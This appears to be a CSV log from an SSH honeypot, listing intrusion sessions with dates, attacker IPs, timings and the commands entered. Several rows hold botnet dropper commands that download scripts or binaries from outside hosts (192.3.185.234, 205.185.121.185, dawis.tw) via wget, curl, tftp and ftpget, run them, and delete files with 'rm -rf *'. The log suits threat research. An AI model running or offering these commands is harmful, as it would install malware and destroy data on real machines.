attackdate,attackerip,entrancetime,exittime,commands
2021-11-10,10.0.3.58,20:54:14.555,20:54:37.562,['scp -t /tmp/BuqcLmIH']
2021-11-10,10.0.3.83,21:03:31.718,21:29:32.871,[]
2021-10-28,10.0.3.148,21:49:24.792,21:49:25.480,"['cd /tmp  cd /var/run  cd /mnt  cd /root  cd /', 'wget http://192.3.185.234/run.sh', 'curl -O http://192.3.185.234/run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp 192.3.185.234 -c get run.sh', 'chmod 777 run.sh', 'sh run.sh', 'tftp -r run2.sh -g 192.3.185.234', 'chmod 777 run2.sh', 'sh run2.sh', 'ftpget -v -u anonymous -p anonymous -P 21 192.3.185.234 run1.sh run1.sh', 'sh run1.sh', 'rm -rf run.sh run.sh run2.sh run1.sh', 'rm -rf *']"
2021-10-31,10.0.3.102,21:32:51.485,21:58:51.473,"['rm x86_64', 'wget http://205.185.121.185/x86_64', 'chmod 777 *', './x86_64 fw.x86', 'rm x86_64']"
2021-11-08,10.0.3.149,21:52:10.450,21:54:28.576,"['ls', 'sudo ls', 'ftuf', '[ETX]ls', 'cd /home', 'ls', 'cd C[TAB]', 'ls', 'cat i[TAB]07[TAB]', 'exexit']"
2021-11-08,10.0.3.77,22:06:32.055,22:06:41.259,['/ip cloud print']
2021-11-10,10.0.3.127,22:08:35.069,22:28:36.262,"['wget dawis.tw/x86_64', 'wget dawis.tw/i686', 'wget dawis.tw/arm', 'wget dawis.tw/arc', 'wget dawis.tw/arm5', 'wget dawis.tw/arm6', 'wget dawis.tw/arm7', 'wget dawis.tw/i586', 'wget dawis.tw/mips', 'wget dawis.tw/mipsel', 'wget dawis.tw/sh4', 'chmod 777 *', './arc x86', './arm x86', './arm5 x86', './arm6 x86', './arm7 x86', './i586 x86', './i686 x86', './mips x86', './mipsel x86', './sh4 x86', './x86_64 x86;']"
2021-10-28,10.0.3.168,22:15:47.785,22:52:12.899,[]
2021-10-30,10.0.3.7,22:11:13.882,22:11:15.686,['/ip cloud print']
2021-11-07,10.0.3.200,22:42:27.407,22:52:52.365,[]
